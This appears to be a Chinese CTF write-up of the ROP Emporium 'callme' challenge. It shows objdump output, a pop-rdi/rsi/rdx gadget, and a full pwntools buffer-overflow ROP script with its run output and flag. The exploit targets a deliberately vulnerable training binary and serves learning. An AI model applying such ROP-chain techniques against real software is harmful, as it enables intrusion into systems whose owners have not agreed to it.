---
title: callme
published: 2026-05-16
image: ""
tags: [pwn]
category: pwn
draft: false
series: ROP Emporium
---

# 题目简述

虽然同样是调用plt形式的函数，但相比于上一道题，这道题需要按照顺序调用3个函数，并且还贴心地告诉你了参数。只不过要注意，正如题目提示， **x86_64 二进制文件，**需要将这些值加倍

这道题还有另一个解法，甚至是能拿到`shell`权限，虽然是题目描述也提到了，不过在做了`pivot`后再回来看这种感觉就很明显了，这个后面会更新

那我们开始吧

# 解题流程

## 工具

~~好像都用不上啥工具呢~~

## 查反汇编，确定函数地址，找有用gadget

多个函数，相似的函数名，查反汇编应该会更直接

```terminal
objdump -d -M intel ./callme
```

找到：

```terminal
0000000000400720 <callme_one@plt>
0000000000400740 <callme_two@plt>
00000000004006f0 <callme_three@plt>
```

方便看就只把地址挂出来了，顺便看一眼`usefulGadgets`

```terminal
000000000040093c <usefulGadgets>:
  40093c:       5f                      pop    rdi
  40093d:       5e                      pop    rsi
  40093e:       5a                      pop    rdx
  40093f:       c3                      ret
```

连续拿栈上数据放到三个寄存器，这不正是我们要找的么？

三个函数，按顺序来调用，每个都用`gadget`整上三个固定参数，没了

万事俱备，思路也明朗了，那么接下来

## 构造脚本payload

比较长，payload分成三段(每个函数一段)来加会更好看一些

于是乎就长这样：

```python
from pwn import *

p = process('./callme')
p.recv() 

payload = b'A' * 40
payload += p64(0x000000000040093c) +p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(0x0000000000400720)
payload += p64(0x000000000040093c) +p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(0x0000000000400740)
payload += p64(0x000000000040093c) +p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(0x00000000004006f0)
#从左到右依次是gadget(pop三个参数寄存器)、三个参数以及目标函数(callme_num)，以此为结构排三个对应各个目标函数
p.sendline(payload)
p.interactive()
```

依旧跑一下

```terminal
[+] Starting local process './callme': pid 8801
[*] Switching to interactive mode
[*] Process './callme' stopped with exit code 0 (pid 8801)
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

correct

~~怎么感觉一下就没了~~

## 总结

+ 这道题的不同点就在于需要**连续调用三个函数，且每个函数的三个参数都需要精准放入对应寄存器**，但其实并不难

+ 记住每次调用前都要重新准备 `RDI/RSI/RDX`，这也是为了参数的稳定性，是必要的
+ 这种本地题目，本人在做题过程中犯了非技术性错误——**没把`libcallme.so`一起放入目录**。程序可能因为缺少 `libcallme.so` 根本起不来，而并不一定是 `payload` 的锅，**当前工作目录**也会影响动态库加载，**脚本也应该放在同一目录下运行才行**。也希望大家做题时多多注意题目环境
